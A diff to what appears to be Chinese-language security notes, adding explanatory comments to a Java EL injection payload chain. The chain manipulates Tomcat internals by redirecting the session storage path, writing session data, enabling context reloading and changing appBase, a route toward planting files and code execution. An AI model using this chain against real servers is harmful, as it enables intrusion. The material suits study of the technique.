@@ -574,10 +574,13 @@ module.exports = router
 el表达式解析
 ```java
 ${pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a}
-//设置
+//修改 Session 文件存储路径
 ${sessionScope[param.b]=param.c}
+//往 Session 里写数据
 ${pageContext.servletContext.classLoader.resources.context.reloadable=true}
+//Context reloadable 配置为 true（默认是 false）
 ${pageContext.servletContext.classLoader.resources.context.parent.appBase=param.d}
+//修改整个 Tomcat 的 appBase 目录
 ```
 
 这里直接贴exp
